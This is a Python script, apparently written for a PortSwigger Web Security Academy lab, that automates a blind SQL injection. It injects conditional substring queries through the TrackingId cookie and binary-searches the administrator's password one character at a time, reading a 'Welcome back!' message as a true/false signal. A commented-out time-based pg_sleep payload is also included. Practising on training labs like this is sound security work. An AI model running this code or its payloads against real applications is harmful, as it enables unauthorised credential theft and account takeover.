import requests
from bs4 import BeautifulSoup

#This script is for finding the password in the following portswigger web security lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
#It's already determined that the password is 20 characters long and alphanumeric through previous injection
#This is also possible on community burp suite but it takes hours due to the number of combinations, recommend doing with pro edition

def get_server_details():
    global url
    global trackingID
    global session
    #User needs to insert the URL as PortSwigger creates a new URL when starting the lab.
    url = input("Enter Blind SQLi URL:")
    #New Page each time means a different tracking ID
    trackingID = input("Enter TrackingId for requests:")
    #New page each time means a different sesesion code
    session = input("Enter session code:")

#sends a http request with sql injection
def tracking_id_inject(payload1, payload2):

    host = url.lstrip("https://")
    host = host.rstrip("/")

    #injection for affiriming information depending on errors
    injection = "\'and substring((select password from users where username = \'administrator\')," + payload1 + ",1) " + payload2
    
    #injection not for this code
    #can trigger delays when application handles errors well
    #injection = "\'||(select case when (substring((select password from users where username=\'administrator\'),1,1)< \'a\') then pg_sleep(10) else pg_sleep(0) end)-- "
    
    headers = {
        'Host': host,
        'Cookie': 'TrackingId=' + trackingID + injection +'; session=' + session,
        'Sec-Ch-Ua': '"Chromium";v="133", "Not(A:Brand";v="99"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '\"Linux\"',
        'Accept-Language': 'en-US,en;q=0.9',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': url,
        'Accept-Encoding': 'gzip, deflate, br',
        'Priority': 'u=0, i'
    }
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    #print(soup)
    if soup.find(string="Welcome back!"):
        print("True")
        return True
    else:
        print("False")
        return False
        
#find specific character for each of the 20 characters
def find_password_char():
    admin_password = ""
    alpha = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    number = ['0','1','2','3','4','5','6','7','8','9']
    for i in range(1,21):
        print(i)
        if tracking_id_inject(str(i), "< \'a"):
            admin_password += binary_search_number(number, 0, len(number) - 1, str(i))
        else:
            admin_password += binary_search_alpha(alpha, 0, len(alpha) - 1, str(i))
        print(admin_password)
    print(admin_password)

def binary_search_alpha(arr, low, high, payload1):
    mid = (low + high) // 2
    #print(mid)
    if tracking_id_inject(payload1, "= \'" + arr[mid]):
        print("yes")
        return arr[mid]
    elif tracking_id_inject(payload1, "> \'" + arr[mid]):
        return binary_search_alpha(arr, mid + 1, high, payload1)
    else:
        return binary_search_alpha(arr, low, mid - 1, payload1)
        
        
def binary_search_number(arr, low, high, payload1):
    mid = (low + high) // 2
    #print(mid)
    if tracking_id_inject(payload1, "= \'" + arr[mid]):
        return arr[mid]
    elif tracking_id_inject(payload1, "< \'" + arr[mid]):
        return binary_search_number(arr, low, mid - 1, payload1)
    else:
        return binary_search_number(arr, mid + 1, high, payload1)

def test():
    tracking_id_inject("1", "= \'w")


def main():
    get_server_details()
    find_password_char()
    #test()
    
if __name__ == "__main__":
    main()